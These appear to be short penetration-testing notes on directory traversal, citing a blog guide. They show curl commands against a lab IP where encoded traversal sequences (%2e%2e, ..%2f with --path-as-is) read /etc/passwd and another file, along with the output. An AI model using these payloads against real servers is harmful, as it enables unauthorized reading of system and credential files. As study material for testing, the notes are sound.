https://blog.certcube.com/a-guide-to-directory-traversal-vulnerability/


If you cannot get information with regular directory traversal, use special encoding
┌──(hollacosta㉿kali1)-[~]
└─$ curl http://192.168.249.16/cgi-bin/../../../../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

┌──(hollacosta㉿kali1)-[~]
└─$ curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin


 curl --path-as-is http://192.168.249.16:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopt/install.txt

![[Pasted image 20230928110120.png]]
